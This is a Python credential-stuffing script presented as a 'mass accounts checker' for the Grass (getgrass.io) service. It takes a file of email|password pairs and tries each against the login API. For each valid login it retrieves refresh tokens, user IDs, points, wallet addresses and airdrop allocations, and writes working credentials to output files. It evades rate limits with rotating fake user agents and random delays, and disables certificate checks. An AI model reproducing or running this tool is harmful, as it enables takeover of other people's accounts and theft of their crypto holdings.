import requests
import time
import random
from fake_useragent import UserAgent
from colorama import init, Fore
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
init(autoreset=True)

url_login = 'https://api.getgrass.io/login'
url_retrieve = 'https://api.getgrass.io/retrieveUser'
url_allocation = 'https://api.getgrass.io/airdropClaimReceipt?input={"walletAddress":"address","cluster":"mainnet"}'

headers = {
    'origin': 'https://app.getgrass.io',
    'referer': 'https://app.getgrass.io/',
    'user-agent': UserAgent().random
}

banner = """
     _____)           _____)                           
   /                /                             ,    
  /   ___    _ _/_ /   ___   __  _   _   _          ___
 /     / ) _(/_(__/     / ) / (_(_(_/_)_/_)_ o  _(_(_) 
(____ /          (____ /                              
                                                      
"""
print(Fore.CYAN + banner + Fore.RESET)
print(f"{Fore.CYAN}     MASS ACCOUNTS CHECKER | github.com/im-hanzou{Fore.RESET}")
print(f"\n")
filename = input(f"{Fore.BLUE}Input your (USER|PASS) file : {Fore.RESET}")
print(f"\n")

invalid_pass_file = 'invalidpass.txt'
invalid_accs_file = 'invalidaccs.txt'
valid_verified_file = 'valid-verified.txt'
valid_not_verified_file = 'valid-notverified.txt'

def check_allocation(wallet_address):
    try:
        allocation_url = url_allocation.replace("address", wallet_address)
        response = requests.get(allocation_url, headers=headers, verify=False)
        if response.status_code == 200:
            allocation_data = response.json().get('result', {}).get('data', {})
            allocation = allocation_data.get('allocation', 0)
            allocation_real = allocation / 1000000000 
            return allocation_real
        else:
            print(f"{Fore.YELLOW}[ Wallet: {wallet_address} | Failed to fetch allocation | Status: {response.status_code} ]{Fore.RESET}")
            return None
    except Exception as e:
        print(f"{Fore.RED}[ Wallet: {wallet_address} | Error fetching allocation: {str(e)} ]{Fore.RESET}")
        return None

try:
    with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            parts = line.strip().split('|')
            if len(parts) < 2:
                print(f"{Fore.RED}[ Invalid format in line: {line.strip()} ]{Fore.RESET}")
                continue
            
            email = parts[0]
            password = '|'.join(parts[1:])
            
            data = {'username': email, 'password': password}
            response = requests.post(url_login, headers=headers, json=data, verify=False)
            
            if response.status_code == 200:
                result_data = response.json().get('result', {}).get('data', {})
                refresh_token = result_data.get('refreshToken')
                
                if refresh_token:                    
                    retrieve_headers = {
                        **headers,
                        'authorization': f"{refresh_token}"
                    }
                    retrieve_response = requests.get(url_retrieve, headers=retrieve_headers, verify=False)
                    
                    if retrieve_response.status_code == 200:
                        user_data = retrieve_response.json().get('result', {}).get('data', {})
                        is_verified = user_data.get('isVerified', False)
                        emailuser = user_data.get('email', 'N/A')
                        username = user_data.get('username', 'N/A')
                        user_id = user_data.get('userId', 'N/A')
                        total_points = user_data.get('totalPoints', 0)
                        wallet_address = user_data.get('walletAddress', 'N/A')

                        if is_verified and wallet_address != 'N/A':
                            allocation_real = check_allocation(wallet_address)
                            with open(valid_verified_file, 'a') as verified_output:
                                verified_output.write(f"Email: {emailuser} | Password: {password} | Username: {username} | UserID: {user_id} | Points: {total_points} | Wallet: {wallet_address} | Allocation: {allocation_real} $GRASS\n")
                            print(f"{Fore.GREEN}[ VALID - VERIFIED ] Email: {emailuser} | Password: {password} | Username: {username} | UserID: {user_id} | Points: {total_points} | Wallet: {wallet_address} | {Fore.RESET} {Fore.LIGHTMAGENTA_EX}Allocation: {allocation_real} $GRASS{Fore.RESET}")
                        elif is_verified:
                            with open(valid_verified_file, 'a') as verified_output:
                                verified_output.write(f"Email: {emailuser} | Password: {password} | Username: {username} | UserID: {user_id} | Points: {total_points} | Wallet: {wallet_address} | Allocation: N/A\n")
                            print(f"{Fore.GREEN}[ VALID - VERIFIED ] Email: {emailuser} | Password: {password} | Username: {username} | UserID: {user_id} | Points: {total_points} | Wallet: {wallet_address} | Allocation: N/A {Fore.RESET}")
                        else:
                            with open(valid_not_verified_file, 'a') as not_verified_output:
                                not_verified_output.write(f"Email: {emailuser} | Password: {password} | Username: {username} | UserID: {user_id} | Points: {total_points}\n")
                            print(f"{Fore.LIGHTGREEN_EX}[ VALID - NOT VERIFIED ] Email: {emailuser} | Password: {password} | Username: {username} | UserID: {user_id} | Points: {total_points} {Fore.RESET}")
                    
                    else:
                        print(f"{Fore.YELLOW}[  {email} | Failed to retrieve user data | {retrieve_response.status_code} ]{Fore.RESET}")
                
            elif response.status_code == 400:
                print(f"{Fore.RED}[ {email} | INVALID PASSWORD ]{Fore.RESET}")
                with open(invalid_pass_file, 'a') as invalid_pass_output:
                    invalid_pass_output.write(f"{email}|{password}\n")
            elif response.status_code == 404:
                print(f"{Fore.RED}[ {email} | INVALID ACCOUNT ]{Fore.RESET}")
                with open(invalid_accs_file, 'a') as invalid_accs_output:
                    invalid_accs_output.write(f"{email}|{password}\n")
            else:
                print(f"{Fore.YELLOW}[  Unknown response: {response.status_code} | YOUR IP BANNED ]{Fore.RESET}")
            
            delay = random.uniform(1, 5)
            time.sleep(delay)

except FileNotFoundError:
    print(f"{Fore.RED} File not found :) {Fore.RESET}")
